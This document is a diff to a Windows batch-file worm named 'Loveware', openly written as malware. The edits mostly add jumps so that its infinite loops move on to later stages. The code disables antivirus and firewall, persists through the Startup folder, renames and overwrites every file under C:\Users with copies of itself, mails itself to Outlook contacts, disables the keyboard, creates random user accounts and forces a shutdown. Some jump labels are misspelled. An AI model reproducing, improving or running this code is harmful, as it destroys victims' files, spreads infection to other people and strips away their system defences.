@@ -1,6 +1,6 @@
 @echo off
 
-:: LOVEWARE v6.7
+:: LOVEWARE v6.8
 ::
 :: YOU CAN DELETE THIS 
 :: |  |  |  |  |  |  |
@@ -76,7 +76,7 @@ net session >nul 2>&1
 
 if %errorLevel% == 0 (
 
-    goto run
+    goto runner
 
 ) else (
 
@@ -88,7 +88,7 @@ if %errorLevel% == 0 (
 
 )
 
-:run
+:runner
 
 :: Disable antivirus, firewall, taskmaneger...
 
@@ -137,10 +137,12 @@ echo )>>LoveLetter.bat
 
 :copylove
 XCOPY "LoveLetter.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+goto run1
 goto copylove
 
 :: Infect network connected computers
 
+:run1
 @echo off
 SET i=0
 SET "NomeProcesso=Loveware.exe"
@@ -164,6 +166,7 @@ goto Internet
 :Infect
 for /f %%f in ('dir C:\Users\*.* /s /b') do (rename %%f *.bat)
 for /f %%f in ('dir C:\Users\*.bat /s /b') do (copy %0 %%f)
+goto worm
 goto Infect
 
 :: Send Loveware to all the contacts of the user
@@ -207,9 +210,12 @@ echo Mail.send>>%SystemDrive%\mail.vbs
 echo Next>>%SystemDrive%\mail.vbs
 echo ol.Quit>>%SystemDrive%\mail.vbs
 start "" "%SystemDrive%\mail.vbs"
+goto run2
 goto worm
 
 :: Infect autoexec.bat
+
+goto run2
 
 set Slash=\
 if exist %SystemDrive%%Slash%AUTOEXEC.BAT (
@@ -284,9 +290,12 @@ echo 00,00,66,e0,00,00,6b,e0,00,00,21,e0,00,00,00,00 >> "nokeyboard.reg"
 
 :haha
 msg * "You are hacked!"
+goto run3
 goto haha
 
 :: Make the final payload "LoveChoice"
+
+:run3
 
 echo @echo off>LoveChoice.bat
 echo color 57>>LoveChoice.bat
@@ -332,6 +341,7 @@ echo echo Hahahahahahahaha!!!!!!!>>LoveChoice.bat
 
 echo :respawn>>LoveChoice.bat
 echo start Loveware.bat>>LoveChoice.bat
+echo goto crazymouse>>LoveChoice.bat
 echo goto respawn>>LoveChoice.bat
 
 :: Crazy mouse
@@ -340,6 +350,7 @@ echo :crazymouse>>LoveChoice.bat
 echo call mouse moveBy 19x78>>LoveChoice.bat
 echo call mouse moveBy 111x45>>LoveChoice.bat
 echo call mouse moveBy 100x100>>LoveChoice.bat
+echo goto chaos>>LoveChoice.bat
 echo goto crazymouse>>LoveChoice.bat
 
 :: Create some chaos
@@ -350,6 +361,7 @@ echo time 06:06:06>>LoveChoice.bat
 echo nul >> %random%>>LoveChoice.bat
 echo mkdir %random%>>LoveChoice.bat
 echo net user %random% /add>>LoveChoice.bat
+echo goto makemsg>>LoveChoice.bat
 echo goto chaos>>LoveChoice.bat
 
 :: A little message from your lover
@@ -358,24 +370,29 @@ echo :makemsg>>LoveChoice.bat
 echo echo do>>msg.vbs>>LoveChoice.bat
 echo echo Msgbox"I love you darling.....",0+0,"You are hacked!">>msg.vbs>>LoveChoice.bat
 echo echo loop>>msg.vbs>>LoveChoice.bat
+echo goto startmasg>>LoveChoice.bat
 echo goto makemsg>>LoveChoice.bat
 
 echo :startmsg>>LoveChoice.bat
 echo start msg.vbs>>LoveChoice.bat
+echo goto run>>LoveChoice.bat
 echo goto startmsg>>LoveChoice.bat
 
 :: Create a new file and print it with the pritner
 
+echo :run>>LoveChoice.bat
 echo echo I love you!!!>>LOVE.txt>>LoveChoice.bat
 
-:Print
+echo :Print>>LoveChoice.bat
 echo PRINT LOVE.txt /D:LPT2>>LoveChoice.bat
 echo PRINT LOVE.txt /D:LPT1>>LoveChoice.bat
 echo NOTEPAD /P LOVE.txt>>LoveChoice.bat
-goto Print
+echo goto run1>>LoveChoice.bat
+echo goto Print>>LoveChoice.bat
 
 :: Disable keyboard
 
+echo :run1>>LoveChoice.bat
 echo start "nokeyboard.reg">>LoveChoice.bat
 
 :: Rename desktop files
@@ -403,8 +420,10 @@ MD ILoveYou
 CD ILoveYou
 XCOPY "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Loveware.exe"
 CD ILoveYou
+goto run4
 GOTO x
 
+:run4
 echo timeout 400>>LoveChoice.bat
 
 :: Have mersy and let the guy live
@@ -416,10 +435,10 @@ echo cls>>LoveChoice.bat
 echo echo Now it is safe to reboot your computer!>>LoveChoice.bat
 echo echo Thank you for downloading my project and testing it.>>LoveChoice.bat
 
-pause
+echo pause>>LoveChoice.bat
 
 shutdown /s>>LoveChoice.bat
-exit
+echo exit>>LoveChoice.bat
 
 :: Second choice (not a good one :) )
 
@@ -432,7 +451,10 @@ echo :crazymousee>>LoveChoice.bat
 echo call mouse moveBy 19x78>>LoveChoice.bat
 echo call mouse moveBy 111x45>>LoveChoice.bat
 echo call mouse moveBy 100x100>>LoveChoice.bat
+echo goto run4>>LoveChoice.bat
 echo goto crazymousee>>LoveChoice.bat
+
+echo :run4>>LoveChoice.bat
 
 echo echo ......>>LoveChoice.bat
 
@@ -455,9 +477,12 @@ echo echo Do not close Loveware or Lovewatch, this will kill your computer!!!!!!
 
 echo :loop>>LoveChoice.bat
 echo start Loveware.exe>>LoveChoice.bat
+echo goto run5>>LoveChoice.bat
 echo goto loop>>LoveChoice.bat
 
 :: Copy Loveware and some other things to the startup folder
+
+echo :run5>>LoveChoice.bat
 
 XCOPY "Loveware.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 :x
@@ -465,18 +490,22 @@ MD IHateYou
 CD IHateYou
 XCOPY "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Loveware.exe"
 CD IHateYou
+goto run6
 GOTO x
 
 :: An angry message :)
 
+:run6
 echo :msgbox>>LoveChoice.bat
 echo echo do>>msg.vbs>>LoveChoice.bat
 echo echo Msgbox"I hate you... Here is the payback for the things you did to me!",0+0,"You are hacked!">>msg.vbs>>LoveChoice.bat
 echo echo loop>>msg.vbs>>LoveChoice.bat
+echo msginf>>LoveChoice.bat
 echo goto msgbox>>LoveChoice.bat
 
 echo :msginf>>LoveChoice.bat
 echo start msg.vbs>>LoveChoice.bat
+echo goto dangerouschaos>>LoveChoice.bat
 echo goto msginf>>LoveChoice.bat
 
 :: Making your pc unusable
@@ -488,17 +517,23 @@ echo time 06:06:06>>LoveChoice.bat
 echo nul >> %random%>>LoveChoice.bat
 echo mkdir %random%>>LoveChoice.bat
 echo net user %random% /add>>LoveChoice.bat
+echo goto run6>>LoveChoice.bat
 echo goto dangerouschaos>>LoveChoice.bat
 
 :: Create a new file and print it with the pritner
 
+echo run6>>LoveChoice.bat
+
 echo echo I hate you!!!>>LOVE.txt>>LoveChoice.bat
 
-:print
+echo :print>>LoveChoice.bat
 echo PRINT LOVE.txt /D:LPT2>>LoveChoice.bat
 echo PRINT LOVE.txt /D:LPT1>>LoveChoice.bat
 echo NOTEPAD /P LOVE.txt>>LoveChoice.bat
-goto print
+echo goto run7>>LoveChoice.bat
+echo goto print>>LoveChoice.bat
+
+echo :run7>>LoveChoice.bat
 
 :: Disable keyboard
 
